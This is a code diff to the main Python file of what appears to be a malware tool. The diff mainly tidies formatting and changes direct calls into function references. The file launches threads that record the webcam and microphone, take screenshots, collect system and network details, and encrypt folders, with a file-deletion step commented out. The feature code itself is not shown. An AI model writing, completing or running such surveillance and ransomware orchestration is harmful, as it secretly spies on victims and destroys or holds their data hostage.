@@ -1,6 +1,5 @@
 import threading
 
-import Features.feature
 from Features.feature import \
     Webcamera, \
     Screenshot, \
@@ -9,8 +8,10 @@ from Features.feature import \
     CmdPrompts, \
     FileEncryption
 
+
 class MainFileException(Exception):
     pass
+
 
 def main():
     ascii_art = """
@@ -23,18 +24,18 @@ def main():
         """
     print(ascii_art)
 
-    for i in range(5,0,-1):
+    for i in range(5, 0, -1):
         print(f"Wait: {i}")
 
     # List of features to run
     features = [
-        Webcamera.record_screen(),
-        Screenshot.screenshot(),
-        Microphone.audio_recording(),
-        SysInfo.system_information(),
-        CmdPrompts.ipconfig_all(),
-        FileEncryption.encrypt_folders(),
-        #FileEncryption.delete_files()
+        Webcamera.record_screen,
+        Screenshot.screenshot,
+        Microphone.audio_recording,
+        SysInfo.system_information,
+        CmdPrompts.ipconfig_all,
+        FileEncryption.encrypt_folders,
+        # FileEncryption.delete_files()
     ]
 
     try:
@@ -48,9 +49,9 @@ def main():
         # Wait for all threads to finish
         for thread in threads:
             thread.join()
-
     except Exception as e:
-        raise MainFileException("Main failed to run") from e
+        raise MainFileException(f"Main failed to run") from e
+
 
 if __name__ == '__main__':
     try:
